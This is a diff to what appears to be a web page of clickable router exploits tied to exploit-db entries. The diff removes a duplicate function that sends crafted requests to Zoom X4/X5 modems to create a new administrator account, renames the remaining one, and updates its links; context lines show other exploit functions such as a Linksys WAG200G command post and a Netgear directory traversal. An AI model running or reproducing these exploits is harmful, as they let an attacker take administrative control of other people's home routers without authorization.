@@ -332,28 +332,6 @@ function wag200gb_command(ip)
 	post('http://' + ip + '/setup.cgi', form);
 }
 
-// Zoom X4, X5 ADSL Modem and Router - Create New Administrator Account
-function x4x5_resetadminpass(ip)
-{
-
-	
-    ip = ip || "192.168.1.1";
-    firmwarever = prompt("Firmware version (Lower than 2.5 or 3): ");
-    username = prompt("New username: ");
-    password = prompt("New password: ");
-
-    urlv1 ='/emweb/PopOutUserAdd.htm?id=70&user_id="' + username + '"&priv=v2&pass1="' + password +'"&pass2="' + password +'"&cmdSubmit=Save+Changes'
-	urlv2 = '/emweb/PopOutUserAdd.htm?id=70&Zadv=1&ex_param1=adminuser_id="' + username + '"&priv=v1&pass1="' + password +'"&pass2="' + password +'"&cmdSubmit=Save+Changes'
-
-    if (firmwarever <= 2.5)
-    {
-    	document.location="http://"+ip+urlv1;
-	}
-	else {
-		document.location="http://"+ip+urlv2;	
-	}
-}
-
 
 // Netgear SPH200D - Directory Traversal
 function sph200d_dirtraversal(ip)
@@ -1964,7 +1942,7 @@ function httpGet(url)
 }
 
 //Zoom X4 and X5 ADSL Modem and Router - New Admin Username - js by sinnet3000
-function zoomX_changeadminpass(ip)
+function zoomX_newadmin(ip)
 {
     ip = ip || "10.0.0.2";
     var username = prompt("New username")
@@ -4283,8 +4261,8 @@ a=a+1
 <article>
 	<div>07/10/13</div>
 	<div><a href="http://www.exploit-db.com/exploits/26736/">[+]</a></div>
-	<div><a href="javascript:zoomX_changeadminpass()">Zoom X4, X5 ADSL Modem and Router - Create New Administrator Account/a></div>
-	<div><a href="javascript:zoomX_changeadminpass(ip)" onclick="return ip=prompt('IP:');">[SET IP]</a></div>
+	<div><a href="javascript:zoomX_newadmin()">Zoom X4, X5 ADSL Modem and Router - Create New Administrator Account/a></div>
+	<div><a href="javascript:zoomX_newadmin(ip)" onclick="return ip=prompt('IP:');">[SET IP]</a></div>
 </article>
 <div style="float: right"><a href="#">^ Top</a></div>
 </section>
